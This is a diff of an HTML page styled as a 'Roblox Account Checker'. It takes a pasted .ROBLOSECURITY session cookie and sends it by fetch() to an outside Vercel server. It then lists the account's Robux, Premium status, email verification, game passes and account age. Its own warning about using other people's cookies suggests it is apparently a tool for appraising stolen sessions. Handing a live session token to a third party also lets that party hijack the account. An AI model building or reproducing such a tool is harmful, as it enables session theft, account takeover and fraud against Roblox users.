@@ -1,82 +1,46 @@
+
 <!DOCTYPE html>
-<html lang="pl">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox – nazwa z .ROBLOSECURITY</title>
+  <title>Roblox Account Checker – .ROBLOSECURITY</title>
   <style>
-    body { 
-      font-family: Arial, sans-serif; 
-      max-width: 600px; 
-      margin: 40px auto; 
-      padding: 20px; 
-      background: #111; 
-      color: #eee; 
-    }
-    textarea { 
-      width: 100%; 
-      height: 140px; 
-      background: #222; 
-      color: #eee; 
-      border: 1px solid #444; 
-      padding: 12px; 
-      font-family: monospace; 
-      resize: vertical;
-    }
-    button { 
-      padding: 14px 32px; 
-      background: #1e90ff; 
-      border: none; 
-      color: white; 
-      font-size: 17px; 
-      cursor: pointer; 
-      margin: 15px 0; 
-      border-radius: 4px;
-    }
-    button:hover { 
-      background: #0c7ae6; 
-    }
-    #result { 
-      margin-top: 25px; 
-      padding: 20px; 
-      background: #1a1a1a; 
-      border: 1px solid #444; 
-      border-radius: 8px; 
-      min-height: 120px; 
-      line-height: 1.6;
-    }
-    .error { color: #ff4d4d; }
-    .success { color: #00ff9d; }
-    b { color: #ddd; }
+    body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
+    textarea { width: 100%; height: 140px; background: #222; color: #eee; border: 1px solid #444; padding: 12px; font-family: monospace; resize: vertical; }
+    button { padding: 14px 32px; background: #1e90ff; border: none; color: white; font-size: 17px; cursor: pointer; margin: 15px 0; border-radius: 4px; }
+    button:hover { background: #0c7ae6; }
+    #result { margin-top: 25px; padding: 20px; background: #1a1a1a; border: 1px solid #444; border-radius: 8px; min-height: 240px; line-height: 1.6; }
+    .error { color: #ff4d4d; } .success { color: #00ff9d; } b { color: #ddd; } small { color: #aaa; }
+    #avatar { max-width: 100%; height: auto; border-radius: 12px; margin: 15px 0; border: 2px solid #444; display: block; }
   </style>
 </head>
 <body>
 
-<h2>Pobierz nazwę użytkownika Roblox z cookie</h2>
+<h2>Roblox Account Info from .ROBLOSECURITY Cookie</h2>
 
 <p style="color:#ffcc00; font-weight:bold;">
-  <strong>OSTRZEŻENIE:</strong> używanie cudzych cookie jest niezgodne z regulaminem Roblox i może skutkować banem
+  <strong>WARNING:</strong> Using someone else's cookie violates Roblox ToS and can lead to permanent account ban.
 </p>
 
-<textarea id="cookie" placeholder="Wklej tutaj sam ciąg .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
-
+<textarea id="cookie" placeholder="Paste the .ROBLOSECURITY value here (without '.ROBLOSECURITY=')"></textarea>
 <br>
-<button onclick="sprawdz()">Sprawdź</button>
+<button onclick="checkAccount()">Check Account</button>
 
 <div id="result"></div>
 
 <script>
-async function sprawdz() {
+async function checkAccount() {
   const cookieVal = document.getElementById('cookie').value.trim();
   const result = document.getElementById('result');
   result.innerHTML = '';
 
   if (cookieVal.length < 200) {
-    result.innerHTML = '<span class="error">Wklej poprawne cookie! (zbyt krótki ciąg)</span>';
+    result.innerHTML = '<span class="error">Cookie is too short or invalid</span>';
     return;
   }
 
-  result.innerHTML = '<i>Proszę czekać... trwa weryfikacja</i>';
+  result.innerHTML = '<i>Checking account... please wait</i>';
 
   try {
     const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {
@@ -88,34 +52,57 @@ async function sprawdz() {
     const json = await resp.json();
 
     if (json.error) {
-      result.innerHTML = `<span class="error">Błąd: ${json.error}</span>`;
+      result.innerHTML = `<span class="error">Error: ${json.error}</span>`;
       return;
     }
 
     if (json.success) {
-      result.innerHTML = `
-        <span class="success">Zalogowano pomyślnie!</span><br><br>
+      const creationDate = json.created !== 'failed to fetch'
+        ? new Date(json.created).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })
+        : '—';
 
-        <b>Nazwa użytkownika:</b> ${json.username}<br>
+      let avatarHtml = json.avatarUrl
+        ? `<img id="avatar" src="${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=No+Avatar';">`
+        : '<p style="color:#ffcc00;">Could not load avatar</p>';
+
+      const mm2Passes = [429957, 1308795];
+      let mm2Count = mm2Passes.filter(id => json.hasGamePasses?.includes(id)).length;
+      const mm2Color = mm2Count > 0 ? '#00ff9d' : '#ff4d4d';
+
+      const ampPasses = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
+      let ampCount = ampPasses.filter(id => json.hasGamePasses?.includes(id)).length;
+      const ampColor = ampCount > 0 ? '#00ff9d' : '#ff4d4d';
+
+      const sabPasses = [1227013099, 1229510262, 1228591447];
+      let sabCount = sabPasses.filter(id => json.hasGamePasses?.includes(id)).length;
+      const sabColor = sabCount > 0 ? '#00ff9d' : '#ff4d4d';
+
+      result.innerHTML = `
+        <span class="success">Account verified successfully!</span><br><br>
+        ${avatarHtml}
+        <b>Username:</b> ${json.username}<br>
         <b>Display Name:</b> ${json.displayName}<br>
         <b>User ID:</b> ${json.userId}<br>
-        <b>Roblox Premium:</b> 
-          <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
-            ${json.hasPremium ? 'TAK ✓' : 'NIE ✗'}
-          </span><br>
-        <b>Robux na koncie:</b> 
-          <span style="color: #ffcc00; font-weight: bold;">
-            ${json.robux.toLocaleString('pl-PL')} Robux
-          </span>
+        <b>Roblox Premium:</b> <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
+        
+        <b>Email / Phone Verified:</b> <span style="color: ${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
+          ${json.emailVerified ? 'YES ✓ (hat detected)' : 'NO ✗'}
+        </span><br>
+        
+        <b>Robux Balance:</b> <span style="color: #ffcc00; font-weight: bold;">${json.robux.toLocaleString('en-US')} Robux</span><br>
+        
+        <b>MM2 Gamepasses:</b> <span style="color: ${mm2Color}; font-weight: bold;">${mm2Count}</span><br>
+        <b>AMP Gamepasses:</b> <span style="color: ${ampColor}; font-weight: bold;">${ampCount}</span><br>
+        <b>SAB Gamepasses:</b> <span style="color: ${sabColor}; font-weight: bold;">${sabCount}</span><br>
+        
+        <b>Account Age:</b> <span style="color: #ffcc00; font-weight: bold;">${json.accountAgeDays} days</span><br>
+        <b>Created:</b> ${creationDate} ${json.created !== 'failed to fetch' ? `<small>(${json.created.split('T')[0]})</small>` : ''}<br>
       `;
-    } else {
-      result.innerHTML = '<span class="error">Nieznana odpowiedź serwera</span>';
     }
   } catch (e) {
-    result.innerHTML = `<span class="error">Błąd połączenia: ${e.message}</span>`;
+    result.innerHTML = `<span class="error">Connection error: ${e.message}</span>`;
   }
 }
 </script>
-
 </body>
 </html>
